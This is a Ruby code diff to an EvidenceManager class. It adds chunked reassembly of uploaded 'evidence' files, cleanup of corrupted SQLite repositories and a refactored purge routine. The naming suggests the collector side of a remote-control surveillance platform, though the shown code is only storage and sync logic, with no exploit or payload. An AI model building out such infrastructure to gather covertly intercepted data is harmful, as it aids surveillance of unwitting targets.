@@ -21,6 +21,7 @@ class EvidenceManager
   include RCS::Tracer
 
   REPO_DIR = Dir.pwd + '/evidence'
+  REPO_CHUNK_DIR = Dir.pwd + '/evidence_chunk'
 
   SYNC_IDLE = 0
   SYNC_IN_PROGRESS = 1
@@ -54,7 +55,7 @@ class EvidenceManager
 
       db.close
     rescue Exception => e
-      trace :warn, "Cannot insert into the repository: #{e.message}"
+      trace :warn, "Cannot insert into the repository: [#{session[:instance]}]: #{e.class} #{e.message}"
     end
   end
   
@@ -70,7 +71,7 @@ class EvidenceManager
       db.execute("UPDATE info SET sync_status = #{SYNC_TIMEOUTED} WHERE sync_status = #{SYNC_IN_PROGRESS};")
       db.close
     rescue Exception => e
-      trace :warn, "Cannot update the repository: #{e.message}"
+      trace :warn, "Cannot update the repository: [#{session[:instance]}]: #{e.class} #{e.message}"
     end
     trace :info, "[#{session[:instance]}] Sync has been timeouted"
   end
@@ -87,22 +88,27 @@ class EvidenceManager
       db.execute("UPDATE info SET sync_status = #{status};")
       db.close
     rescue Exception => e
-      trace :warn, "Cannot update the repository: #{e.message}"
+      trace :warn, "Cannot update the repository: [#{session[:instance]}]: #{e.class} #{e.message}"
     end
 
   end
 
   def sync_timeout_all
     begin
+      current = ''
       Dir[REPO_DIR + '/*'].each do |e|
+        current = e
         db = SQLite.open(e)
         # update only if the status in IN_PROGRESS
         # this will prevent erroneous overwrite of the IDLE status
         db.execute("UPDATE info SET sync_status = #{SYNC_TIMEOUTED} WHERE sync_status = #{SYNC_IN_PROGRESS};")
         db.close
       end
+    rescue SQLite3::NotADatabaseException
+      trace :warn, "Corrupted repository [#{current}], deleting it..."
+      FileUtils.rm_rf current
     rescue Exception => e
-      trace :warn, "Cannot update the repository: #{e.message}"
+      trace :warn, "Cannot update the repository: [#{current}]: #{e.class} #{e.message}"
     end
   end
 
@@ -136,7 +142,61 @@ class EvidenceManager
       raise "Cannot save evidence"
     end
   end
-  
+
+  def store_evidence_chunk(session, id, base, chunk, size, content)
+    Dir::mkdir(REPO_CHUNK_DIR) if not File.directory?(REPO_CHUNK_DIR)
+    path =  REPO_CHUNK_DIR + '/' + session[:ident] + '_' + session[:instance]
+
+    header_len = 12
+    header = []
+
+    # if the file already exist, take the data from it
+    # otherwise initialize it with the current data
+    if File.exist?(path)
+      File.open(path, 'rb+') {|f| header = f.read(header_len).unpack('I*') }
+    else
+      File.open(path, 'wb+') do |f|
+        header = [id, base, size]
+        f.write(header.pack('I*'))
+      end
+    end
+
+    # consistency check on id
+    if id != header[0]
+      File.delete(path)
+      return 0, nil
+    end
+
+    # consistency on the base address to start writing
+    # if not equal, send back the latest we have written
+    return header[1] if header[1] != base
+
+    # go to the base for writing and append the chunk
+    File.open(path, 'rb+') do |f|
+      f.seek(header_len + header[1], IO::SEEK_SET)
+      f.write(content)
+
+      header[1] += chunk
+
+      # go back to the header
+      f.seek(0, IO::SEEK_SET)
+      f.write(header.pack('I*'))
+    end
+
+    # not finished yet
+    return header[1], nil if header[1] != size
+
+    # the file is complete, read the content and return it
+    complete = File.open(path, 'rb+') do |f|
+      f.seek(header_len, IO::SEEK_SET)
+      f.read
+    end
+
+    File.delete(path)
+
+    return size, complete
+  end
+
   def get_evidence(id, instance)
     # sanity check
     path = REPO_DIR + '/' + instance
@@ -232,9 +292,13 @@ class EvidenceManager
 
     # delete file if empty
     if File.size(path) == 0
+      trace :warn, "Corrupted repository [#{instance}], deleting it..."
       FileUtils.rm_rf path if File.size(path) == 0
       return
     end
+
+    # skip small files
+    return if File.size(path) < 50_000
 
     begin
       db = SQLite.open(path)
@@ -246,6 +310,14 @@ class EvidenceManager
     rescue Exception => e
       trace :warn, "Cannot compact the repository [#{instance}]: #{e.class} #{e.message}"
     end
+  end
+
+  def purge(instance)
+    entry = instance_info(instance)
+    evidence = evidence_info(instance)
+    # IN_PROGRESS sync must be preserved
+    # evidences must be preserved
+    File.delete(REPO_DIR + '/' + instance) if entry['sync_status'] != SYNC_IN_PROGRESS and evidence.length == 0
   end
 
   def create_repository(session)
@@ -304,11 +376,7 @@ class EvidenceManager
     # delete all the instance with zero evidence pending and not in progress
     if options[:purge] then
       instances.each do |e|
-        entry = instance_info(e)
-        evidence = evidence_info(e)
-        # IN_PROGRESS sync must be preserved
-        # evidences must be preserved
-        File.delete(REPO_DIR + '/' + e) if entry['sync_status'] != SYNC_IN_PROGRESS and evidence.length == 0
+        purge(e)
       end
     end
 
